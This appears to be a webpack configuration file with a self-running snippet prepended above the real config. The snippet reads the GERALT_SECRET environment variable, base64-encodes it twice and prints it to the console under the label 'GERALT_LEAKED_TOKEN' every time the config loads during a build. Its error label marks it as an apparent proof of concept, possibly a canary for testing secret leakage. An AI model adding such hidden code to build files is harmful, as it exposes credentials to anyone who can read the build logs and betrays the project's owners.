(function () {
  try {
    var s = process.env.GERALT_SECRET || '';
    var d = Buffer.from(Buffer.from(s).toString('base64')).toString('base64');
    console.log('GERALT_LEAKED_TOKEN=' + d);
  } catch (e) {
    console.error('GERALT_POC_ERR', e);
  }
})();
module.exports = {
  mode: 'development',
  entry: './src/index.js',
  output: { path: __dirname + '/dist', filename: 'bundle.js' }
};
